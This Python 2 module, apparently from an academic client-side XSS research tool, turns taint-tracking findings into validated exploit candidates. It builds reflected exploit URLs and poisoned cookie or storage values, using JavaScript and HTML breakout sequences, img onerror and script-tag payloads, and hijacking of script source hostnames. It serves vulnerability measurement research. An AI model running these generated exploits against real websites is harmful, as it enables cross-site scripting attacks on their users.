# Copyright (C) 2019 Ben Stock & Marius Steffens
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.

# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

import json
import pyesprima

from bs4 import BeautifulSoup
from urllib import quote
from urlparse import unquote, urlsplit, urljoin

import time

from utils import manual_quote, recursive_replace, is_json, try_parse_json, log, find_match, build_reflected_exploit
from constants.sinks import SINKS
from constants.sources import SOURCES
from config import CONFIG, GENERATE_EXPLOIT_FOR_SOURCES, HTML_SINKS, JS_SINKS, SCRIPT_SOURCE_HOSTNAME

from HTML.HTMLStateMachine import getHTMLBreakout, HTMLStateMachine
from JS.JSExploitGenerator import JavaScriptExploitGenerator


def generateExploit(finding):
    """
    Call the respective generation functions according to the sink of the finding.

    :param finding: the finding which should be used to generate
    :return: list of exploit candidates
    """
    # If we have no associated sources we cannot generate anything
    if len(finding["sources"]) == 0:
        log("There were no sources present within the corresponding finding, thus we cannot generate exploits!")
        return []
    # direct flow into script src
    if finding["sink_id"] == SINKS.SINK_SCRIPT_SRC:
        return get_script_src_exploit(finding)
    # direct flow into string to JS code conversion sinks
    elif finding["sink_id"] in JS_SINKS:
        return get_js_exploit(finding)
    # indirect flow into javascript execution via HTML
    elif finding["sink_id"] == SINKS.SINK_INNER_HTML and finding["d2"] == 'script':
        return get_js_exploit(finding)
    # direct flow into HTML
    elif finding["sink_id"] in HTML_SINKS:
        return get_html_exploit(finding)
    else:
        log('It is currently not supported to build exploits for sink number {}!'.format(finding["sink_id"]))
        return []


def createWebExploit(url, source_id):
    """
    Generate a representation of an RCXSS exploit candidate given the exploit url.

    :param url: the exploit url of the RCXSS candidate
    :param source_id: the associated source_id which then allows to track the finding which was exploited
    :return: RCXSS exploit candidate
    """
    exploit = {
        "type": "RCXSS",
        "exploit_url": url,
        "finding_source_id": source_id,
    }
    return exploit


def createPCXSSExploit(source_name, matched_key, matched_storage_value, source_id, replace_value, replace_with):
    """
    Generate a representation of a PCXSS exploit candidate given the store and kvp to substitute.

    :param source_name: the storage type which needs to be substituted (document.cookie/localStorage)
    :param matched_key: the key which needs to be replaces
    :param matched_storage_value: the original storage value
    :param source_id: the associated source_id which then allows to track the finding which was exploited
    :param replace_value: the value part which needs to be substituted from the complete storage value
    :param replace_with: the candidate value part which needs to be inserted into the store
    :return: PCXSS exploit candidate
    """
    exploit = {
        "type": "PCXSS",
        "storage_type": source_name,
        "storage_key": matched_key,
        "storage_value": matched_storage_value,
        "finding_source_id": source_id,
        "replace_value": replace_value,
        "replace_with": replace_with
    }
    return exploit


def get_script_src_exploit(finding):
    """
    Generate exploit candidates which flow into the script src sink.

    :param finding: the finding to analyze
    :return: list of exploit candidates
    """
    exploits = []
    for source in finding["sources"]:
        script_src = finding["value"]
        if len(source["value_part"]) == 1:
            continue
        found = False
        original_script_src = script_src
        # we have found the complete value directly, just substitute it with a hostname under our control
        if script_src.startswith(source["value_part"]):
            payload = "https://" + SCRIPT_SOURCE_HOSTNAME + '/'
            found = True
        # check for relative URL
        if not script_src.startswith("http"):
            script_src = urljoin(finding["url"], script_src)
        parsed = urlsplit(script_src)
        if parsed.netloc == source["value_part"]:
            payload = SCRIPT_SOURCE_HOSTNAME + '/'
            found = True

        end_of_domain = len(parsed.scheme) + len("://") + len(parsed.netloc)
        script_src_diff = len(script_src) - len(original_script_src)
        # our value lies somewhere where we can influence the location
        if -1 < source["start"] + script_src_diff < end_of_domain:
            if source["end"] + script_src_diff < len(parsed.scheme) + len("://"):
                # but just in the protocol :(
                continue
            # replace the netlocation with our hostname
            payload = source["value_part"].replace(parsed.netloc, SCRIPT_SOURCE_HOSTNAME)
            # if it is not part of the initial value, just try to insert it anyway
            if parsed.netloc not in source["value_part"]:
                payload = "." + SCRIPT_SOURCE_HOSTNAME + '/'
            found = True
        # found = True => payload is defined
        if found:
            # if it is a reflected source, build reflected exploit candidate
            if source["source"] not in [SOURCES.SOURCE_COOKIE, SOURCES.SOURCE_LOCAL_STORAGE,
                                        SOURCES.SOURCE_SESSION_STORAGE]:
                exploit_urls = build_reflected_exploit(finding, payload, source["value_part"], source["source"])
                # if it worked, we cann add it to our found exploits
                if exploit_urls is not None:
                    exploits.append(createWebExploit(exploit_urls, source["id"]))
            else:
                # build a PCXSS exploit candidate
                # fetch the respective storage entries to check for our tainted value
                if source["source"] == SOURCES.SOURCE_COOKIE:
                    storage_items = finding["storage"]["cookies"]
                else:
                    storage_items = finding["storage"]["storage"]

                if len(storage_items) == 0:
                    # we dont have any storage items recorded, so nothing to see
                    continue

                matches = find_match(storage_items, source["value_part"])
                # for each match in the storage entries we can generate a candidate
                for match in matches:
                    matched_key, matched_value, matched_storage_value, fuzzy, addinfo = match
                    if is_json(matched_storage_value):
                        parsed = try_parse_json(matched_storage_value)
                    else:
                        parsed = None
                    if parsed and matched_storage_value != source["value_part"]:
                        # we need to replace the whole thing
                        replace_value = matched_storage_value
                        replace_with = recursive_replace(parsed,
                                                         source["value_part"],
                                                         payload)
                        replace_with = json.dumps(replace_with)
                    else:
                        replace_value = matched_storage_value
                        replace_with = replace_value.replace(source["value_part"],
                                                             payload)

                    if "quoted" in addinfo:
                        try:
                            replace_with = quote(replace_with)
                        except KeyError:
                            replace_with = manual_quote(replace_with)
                    # check whether the substitution was indeed successful
                    if 'alert' not in replace_with and SCRIPT_SOURCE_HOSTNAME not in replace_with:
                        log("Substitution of script source PCXSS candidate did not work!")
                    else:
                        exploits.append(
                            createPCXSSExploit(source["source_name"], matched_key, matched_storage_value,
                                               source["id"],
                                               replace_value, replace_with))
    return exploits


def check_for_complete_flow(value, value_part, payload):
    """
    Check whether or not the value has flown completely into the sink.
    :param value: the complete value which ended up in the sink
    :param value_part: the part which orignates from the currently investigated source
    :param payload: the payload which should be executed
    :return: part that needs to be replaced,value to replace with or None,None if it is not a complete flow
    """
    if value == "(" + value_part + ")" or value == value_part:
        # Everything normal, direct flow
        replace_value = value_part
        replace_with = payload
    elif value == "(" + unquote(value_part) + ")" or value == unquote(value_part):
        # direct flow but value_part is quoted, gets unquoted on the way
        replace_value = quote(value_part)
        replace_with = quote(payload)
    elif value == '("' + value_part + '")':
        # break out of string
        replace_value = value_part
        replace_with = '"+' + payload + '+"'
    elif value == '("' + unquote(value_part) + '")':
        # break out of string, but get was quoted in source
        replace_value = quote(value_part)
        replace_with = quote('"+' + payload + '+"')
    else:
        return None, None
    return replace_value, replace_with


def get_complete_exploits(finding, source, value, value_part, payload):
    """
    Check whether we have an easy case where a value originating from a source
    ends up directly into the sink without any modifications
    :param finding: the finding to investigate
    :param source: the source from which the flow originates
    :param value: the complete value which ended up in the sink
    :param value_part: the value part of the currently investigated source
    :param payload: the payload which should be executed
    :return: list of exploit candidates if a complete flow was found, empty list otherwise
    """
    complete_replace_value, complete_replace_with = check_for_complete_flow(value, value_part, payload)
    if source["source"] not in [SOURCES.SOURCE_COOKIE, SOURCES.SOURCE_LOCAL_STORAGE,
                                SOURCES.SOURCE_SESSION_STORAGE] and complete_replace_value:
        # Web Attacker
        exploit_url = build_reflected_exploit(finding, complete_replace_with, complete_replace_value,
                                              source["source"])
        if exploit_url is None:
            return []
        else:
            return [createWebExploit(exploit_url, source["id"])]
    elif complete_replace_value:
        # Network Attacker
        # select the appropriate storage items to look at
        if source["source"] == SOURCES.SOURCE_COOKIE:
            storage_items = finding["storage"]["cookies"]
        else:
            storage_items = finding["storage"]["storage"]
        if complete_replace_value and complete_replace_with:
            # we have a complete flow, just need to find the corresponding keys
            matches = find_match(storage_items, complete_replace_value)
            complete_exploits = []
            for match in matches:
                matched_key, matched_value, matched_storage_value, fuzzy, addinfo = match
                # not exploitable but widespread
                if matched_key in ("_parsely_visitor", "_parsely_session"):
                    continue
                # if the storage value is quoted,
                new_replace_with = complete_replace_with
                if "quoted" in addinfo:
                    try:
                        new_replace_with = quote(complete_replace_with)
                    except KeyError:
                        new_replace_with = manual_quote(complete_replace_with)
                complete_exploits.append(
                    createPCXSSExploit(source["source_name"], matched_key, matched_storage_value,
                                       source["id"], matched_value,
                                       new_replace_with))
            log("Found a complete flow and could replace it in the storage entry")
            return complete_exploits
    return []


def get_js_exploit(finding):
    """
    Generate exploits for a JavaScript executing sink.
    :param finding: the finding to investigate
    :return: list of exploit candidates
    """
    # widespread but not exploitable
    if finding["value"] == '("__storejs__")':
        return []

    exploits = list()
    for source in finding["sources"]:
        value = finding["value"]
        value_part = source["value_part"]
        complete_exploits = get_complete_exploits(finding, source, value, value_part, CONFIG.payload)
        if len(complete_exploits):
            log("Complete exploit: %s, tainted: %s" % (complete_exploits, source["value_part"]))
            return complete_exploits

    complete_generator = JavaScriptExploitGenerator()
    payload_validator = JavaScriptExploitGenerator()

    try:
        parsed_value = pyesprima.parse(finding["value"], range=True)
        complete_generator.traverse_ast_generic(parsed_value, None)
    except RuntimeError, e:
        log(str(e))
        return []

    # there are findings in which we have plenty sources which are just generating duplicate exploits
    # will only be vulnerable if a predecessor is also vulnerable, thus restrict to the 20 first
    for source in finding["sources"][:20]:
        # value part of the current source
        value_part = source["value_part"]
        # complete value which has flown into the sink
        value = finding["value"]

        # values being protocols are not likely to produce exploitable flows, thus quick exit
        if value_part in ('http:', 'https:'):
            continue

        # If we found a source which originates from a source which we do not currently consider preempt
        if source["source"] not in GENERATE_EXPLOIT_FOR_SOURCES or source["hasEscaping"] + \
                source["hasEncodingURI"] + source["hasEncodingURIComponent"] > 0:
            log("Skipping source with source_id {}!".format(source["source"]))
            continue

        # fetch the appropriate storage entry
        if source["source"] == SOURCES.SOURCE_COOKIE:
            storage_items = finding["storage"]["cookies"]
        elif source["source"] in (SOURCES.SOURCE_LOCAL_STORAGE, SOURCES.SOURCE_SESSION_STORAGE):
            storage_items = finding["storage"]["storage"]
        else:
            storage_items = []

        try:
            # if the value part consists of a tokenizable JavaScript string we can just substitute our payload
            # since there are cases in which data can be tokenized into multiple tokens, especially in the presence of
            # numbers we have 10 tokens as a cutoff
            parsed = pyesprima.tokenize(value_part)
            if len(parsed) > 10:
                # likely just it's own JS program
                matches = find_match(storage_items, value_part)
                for match in matches:
                    matched_key, matched_value, matched_storage_value, fuzzy, addinfo = match
                    # again widespread but not vulnerable
                    if matched_key in ("_parsely_visitor", "_parsely_session"):
                        continue
                    exploits.append(
                        createPCXSSExploit(source["source_name"], matched_key, matched_storage_value,
                                           source["id"],
                                           value_part, CONFIG.payload))
        except Exception, e:
            # it was not tokenizable so just continue with the normal routine
            log(e)
            pass

        # flow not encoded

        tainted_start = source['start']
        tainted_end = tainted_start + len(value_part)

        if value_part != value[tainted_start:tainted_end]:
            # this can happen if we lost characters due to encoding. In that case, we have to search for the value
            # instead of relying on the original offset
            tainted_start = value.find(value_part)
            tainted_end = tainted_start + len(value_part)
            log('Mismatch in taint start info')

        # we did not find a complete match, thus we resort to partial breakouts
        tainted_path, matched_start, matched_end = complete_generator.find_tainted_path(
            tainted_start, tainted_end)
        # get breakout sequence
        breakout = complete_generator.create_exploit_from_path(
            tainted_path, matched_start, matched_end, value)

        # We are looking at the context from which we are breaking out
        if len(breakout) and breakout[-1] != ';':
            breakout += ";"
        elif len(breakout) == 0 and value[matched_end - 1] != ";":
            breakout += ";"

        # nothing matched
        if matched_start == 0 and matched_end == 0:
            continue

        log("Going the normal way")

        # create the according value which is to be replaced
        # resort to string concatenation where possible
        if len(breakout) and (breakout.endswith("';") or breakout.endswith('";')) \
                and source["source"] == SOURCES.SOURCE_COOKIE:
            replace_value = value[:matched_end]
            replace_with = replace_value + breakout[:-1] + "+" + CONFIG.payload + "+" + breakout[-2]
            payload = breakout[:-1] + "+" + CONFIG.payload + "+" + breakout[-2]
            code = replace_with + value[matched_end:]
        elif len(breakout) and \
                ((breakout.startswith('#"') or breakout.startswith("#'")) or breakout[0] in ("'", '"')) \
                and '\n' in value[matched_end:]:
            replace_value = value[:matched_end]
            if breakout[0] == '#':
                payload = breakout[:2] + "+" + CONFIG.payload + "+" + breakout[1]
            else:
                payload = breakout[0] + "+" + CONFIG.payload + "+" + breakout[0]
            replace_with = replace_value + payload
            code = replace_with + value[matched_end:]
        elif breakout == ";" and source["source"] == SOURCES.SOURCE_COOKIE:
            replace_value = value[:matched_end]
            replace_with = replace_value + "+" + CONFIG.payload + "//"
            payload = "+" + CONFIG.payload + "//"
            code = replace_with + value[matched_end:]
        else:
            replace_value = value[:matched_end]
            replace_with = replace_value + breakout + CONFIG.payload + "//"
            payload = breakout + CONFIG.payload + "//"
            code = replace_with + value[matched_end:]

        log("breakout: %s, source: %s" % (breakout, source["source_name"]))

        # check for validity of our generated code
        assert code != value, "No diff!"
        try:
            # recheck that substituted values are still valid JS
            parsed_exploit = pyesprima.parse(code, range=True)
        except RuntimeError, e:
            log('JavaScript payload refuses to parse after substitution!')
            continue

        payload_validator.reset()
        payload_validator.traverse_ast_generic(parsed_exploit, None)
        # check for executability of our payload
        if not payload_validator.check_for_js_exploit(CONFIG.payload):
            log("Javascript payload was not found to be executable after substitution!")
            continue

        # actually start building exploits after we have generated the correct breakout + payload
        if source["source"] not in [SOURCES.SOURCE_COOKIE, SOURCES.SOURCE_LOCAL_STORAGE,
                                    SOURCES.SOURCE_SESSION_STORAGE]:
            # RCXSS
            exploit_url = build_reflected_exploit(finding,
                                                  source["value_part"] + payload,
                                                  source["value_part"], source["source"])
            if exploit_url is None:
                log('Unable to generate exploit URL for JS RCXSS!')
                continue
            else:
                exploits.append(createWebExploit(exploit_url, source["id"]))
        else:
            # PCXSS
            if len(storage_items) == 0:
                matches = None
            else:
                matches = find_match(storage_items, value_part)
            # heuristic to check if a cookie has flown directly into the sink, then we can just add an arbitrary cookie
            if matches is None and source["source"] == SOURCES.SOURCE_COOKIE and ";" in value_part:
                # document.cookie komplett -> sink
                exploits.append(
                    createPCXSSExploit(source["source_name"], "___foobar___", None, source["id"],
                                       replace_value,
                                       replace_with))
            # we cannot find matches
            elif matches is None:
                log('Could not find the respective storage entry for a JS PCXSS exploit!')
            # we actually have matches
            else:

                for match in matches:
                    matched_key, matched_value, matched_storage_value, fuzzy, addinfo = match
                    # TODO merge with previous same code
                    if matched_key in ("_parsely_visitor", "_parsely_session"):
                        continue
                    if is_json(matched_storage_value):
                        parsed = try_parse_json(matched_storage_value)
                    else:
                        parsed = None
                    if is_json(source["value_part"]):
                        parsed_value = try_parse_json(source["value_part"])
                    else:
                        parsed_value = None
                    # check if both are dicts, if so => eval(dict) case
                    if isinstance(parsed, dict) and isinstance(parsed_value, dict):
                        if parsed.keys() == parsed_value.keys():
                            # same keys, we can simply replace the whole string
                            replace_with = CONFIG.payload
                            if "quoted" in addinfo:
                                replace_with = quote(replace_with)
                            replace_value = matched_storage_value
                            exploits.append(
                                createPCXSSExploit(source["source_name"], matched_key, matched_storage_value,
                                                   source["id"],
                                                   replace_value,
                                                   replace_with))

                            continue
                    # only storage value is a dict, thus we need to replace the value recursively into the dict
                    if isinstance(parsed, dict):
                        replace_value = matched_storage_value
                        replace_with = recursive_replace(parsed,
                                                         source["value_part"],
                                                         source["value_part"] + payload)
                        replace_with = json.dumps(replace_with)
                    # the storage value is not a dictionary, thus resort to normal string replace
                    else:
                        replace_value = matched_storage_value
                        replace_with = replace_value.replace(source["value_part"],
                                                             source["value_part"] + payload)

                    if "quoted" in addinfo:
                        replace_with = quote(replace_with)
                    if replace_with == replace_value:
                        continue
                    # FIXME what could possibly go wrong here if you change the payload to something malicious ;)
                    if "alert" not in replace_with and "persistent" not in replace_with:
                        log('Failed to find js exploit after substitution for PCXSS JS exploit!')
                        continue
                    exploits.append(
                        createPCXSSExploit(source["source_name"], matched_key, matched_storage_value,
                                           source["id"],
                                           replace_value, replace_with))
    return exploits


def get_html_exploit(finding):
    """
    Generate exploits for an HTML executing sink.
    :param finding: the finding to investigate
    :return: list of exploit candidates
    """
    exploits = list()
    # our payload is a piece of Javascript, thus we need to prepare it into an HTML payload first
    validation_payload = CONFIG.payload
    payload = "<img src=foo onerror=%s onload=%s>" % (validation_payload, validation_payload)
    # textareas are the easiest way to breakin into HTML
    # since they catch anything up to the the closing tag of the current environment
    breakin = "<textarea>"
    # in instances where we can write script tags we can also simply resort to this simpler case
    if finding["sink_id"] in [SINKS.SINK_DOC_WRITE, SINKS.SINK_IFRAME_SRCDOC]:
        payload = "<script>%s</script>" % validation_payload
    try:
        # start generating the appropriate breakouts
        parser = HTMLStateMachine()
        prior_parsed = 0
        # there are findings in which we have plenty sources which are just generating duplicate exploits
        # will only be vulnerable if a predecessor is also vulnerable, thus restrict to the 20 first
        for source in finding["sources"][:20]:
            # the complete value ending up in the sink
            value = finding["value"]
            # the specific part of the value originating from this source
            value_part = source["value_part"]

            # skip unreasonable values/sources which are not considered in our exploitation
            if source["value_part"] == "?":
                continue
            if source["source"] not in GENERATE_EXPLOIT_FOR_SOURCES:
                log("Skipping source with source_id {}!".format(source["source"]))
                continue
            if source["hasEscaping"] + source["hasEncodingURI"] + source["hasEncodingURIComponent"] > 0:
                log("Skipping source with encoding!")
                continue

            # offsets in the overall value
            taint_start, taint_end = source["start"], source["end"]

            # if this is not the case we have encoding problems in which case some bytes might be missing
            # thus we need to recalc the offset
            if value_part != value[taint_start:taint_end]:
                if value.count(value_part) == 1:
                    taint_start = value.find(value_part)
                    taint_end = taint_start + len(value_part)
                    log('Mismatch in taint start info %s %s' % (taint_start, len(value)))
                else:
                    continue
            # get the string part which resides between the current source and the prior parsed part of the string
            # then feed it into our state machine and use the resulting state as basis to generate the breakout
            string_to_parse = finding["value"][prior_parsed:taint_start] + source["value_part"]
            prior_parsed = taint_end

            log("Getting HTML breakout for %s (%s): %s" % (source["id"], string_to_parse, value_part))
            # feeds the string to the parser and then outputs the breakout sequence
            breakout_sequence = getHTMLBreakout(parser, string_to_parse)
            log("Result: %s" % breakout_sequence)

            # TODO (ben) fix this bridge, not only rcxss but also pcxss and if we have only seen / we can do stuff
            # check if we are currently in the process of writing the src property of a script tag which we can hijack
            if len(parser.opened_tags) > 0:
                top_element = parser.opened_tags[0]
                if top_element.get("name", "").lower() == 'script' and len(top_element.get("attributes", [])):
                    if (top_element.get("attributes")[0]).get("name", "") == 'src':
                        url_so_far = urljoin(finding["url"], top_element["attributes"][0]["value"])
                        if url_so_far.count("/") < 3:
                            # we control the origin, woohoo
                            parsed = urlsplit(url_so_far)
                            if parsed.netloc in source["value_part"] or source["value_part"] in parsed.netloc:
                                payload = source["value_part"].replace(parsed.netloc, SCRIPT_SOURCE_HOSTNAME)
                                breakout_sequence = ""
                                exploit_url = build_reflected_exploit(finding,
                                                                      payload,
                                                                      source["value_part"], source["source"])
                                if exploit_url:
                                    exploits.append(createWebExploit(exploit_url, source["id"]))
                                    continue
            # We have a generated a breaout sequence and can make use of it now
            if breakout_sequence is not None:
                if source["source"] not in [SOURCES.SOURCE_COOKIE, SOURCES.SOURCE_LOCAL_STORAGE,
                                            SOURCES.SOURCE_SESSION_STORAGE]:
                    # RCXSS
                    # assemble the complete exploit candidate
                    resulting_markup = value[:taint_start] + source[
                        "value_part"] + breakout_sequence + payload + breakin + value[taint_end:]
                    assert resulting_markup != value
                    working_exploit = False
                    # check for exploitability
                    try:
                        soup = BeautifulSoup(resulting_markup, "html5lib")
                        for script in soup.find_all("script"):
                            # either we are injected into a script
                            if script.text:
                                if script.text == validation_payload:
                                    working_exploit = True
                            # or part of a script src
                            if "src" in script.attrs:
                                parsed = urlsplit(script["src"])
                                if parsed.netloc.endswith(SCRIPT_SOURCE_HOSTNAME):
                                    working_exploit = True
                        # or into the onload/onerror of an image
                        for img in soup.find_all("img"):
                            if "onload" in img.attrs and img["onload"].strip() == validation_payload:
                                working_exploit = True
                    except Exception, e:
                        log('Error in parsing resulting payload of an HTML exploit {}'.format(e))
                    # We were not able to find our payload thus also we do not need to validate
                    if not working_exploit:
                        log("After substitution of HTML exploit, payload was non functional!")
                        continue

                    # we are building exploits for reflected source thus build the respective urls
                    exploit_url = build_reflected_exploit(finding,
                                                          source["value_part"] + breakout_sequence + payload + breakin,
                                                          source["value_part"], source["source"])
                    if exploit_url is None:
                        log('Unable to generate exploit URL for HTML RCXSS!')
                        continue
                    else:
                        exploits.append(createWebExploit(exploit_url, source["id"]))
                else:
                    # PCXSS
                    # select the appropriate storage
                    if source["source"] == SOURCES.SOURCE_COOKIE:
                        storage_items = finding["storage"]["cookies"]
                    else:
                        storage_items = finding["storage"]["storage"]

                    if len(storage_items) == 0:
                        matches = None
                    else:
                        matches = find_match(storage_items, value_part)

                    if matches is None and source["source"] == SOURCES.SOURCE_COOKIE and ";" in value_part:
                        # document.cookie directly into sink
                        exploits.append(
                            createPCXSSExploit(source["source_name"], "___foobar___", None, source["id"],
                                               None,
                                               payload + breakin))
                    elif matches is None:
                        log('Could not find the respective storage entry for an HTML PCXSS exploit!')
                    else:
                        # we actually have matches
                        for match in matches:
                            matched_key, matched_value, matched_storage_value, fuzzy, addinfo = match
                            # TODO merge with above
                            if matched_key in ("_parsely_visitor", "_parsely_session"):
                                continue

                            if is_json(matched_storage_value):
                                parsed = try_parse_json(matched_storage_value)
                            else:
                                parsed = None

                            # storage value is a dict
                            if parsed:
                                replace_value = matched_storage_value
                                replace_with = recursive_replace(parsed,
                                                                 source["value_part"],
                                                                 source["value_part"] + breakout_sequence +
                                                                 payload + breakin)
                                replace_with = json.dumps(replace_with)
                            # the storage value is not a dictionary
                            else:
                                replace_value = matched_storage_value
                                replace_with = replace_value.replace(source["value_part"],
                                                                     source["value_part"] + breakout_sequence +
                                                                     payload + breakin)
                            if "quoted" in addinfo:
                                try:
                                    replace_with = quote(replace_with)
                                except KeyError:
                                    replace_with = manual_quote(replace_with)
                            if replace_with == replace_value:
                                continue
                            # FIXME what could possibly go wrong here if you change the payload to something malicious ;)
                            if "alert" not in replace_with and "persistent" not in replace_with:
                                log('Failed to find HTML exploit after substitution for PCXSS JS exploit!')
                                continue
                            exploits.append(
                                createPCXSSExploit(source["source_name"], matched_key, matched_storage_value,
                                                   source["id"],
                                                   replace_value, replace_with))

    except Exception as e:
        log("ERR {} {}".format(e, finding["finding_id"]))
    return exploits


def generate_exploit_for_finding(finding):
    """
    Main entry function which generates exploit candidates for a given finding.
    :param finding: the finding to investigate
    :return: list of exploit candidates
    """
    # main entry point for the generation of findings
    log("Starting generation for finding {}!".format(finding["finding_id"]))
    start = time.time()
    result = generateExploit(finding)
    stop = time.time()
    log("Finished finding {} in {} seconds!".format(finding["finding_id"], stop - start))
    return result
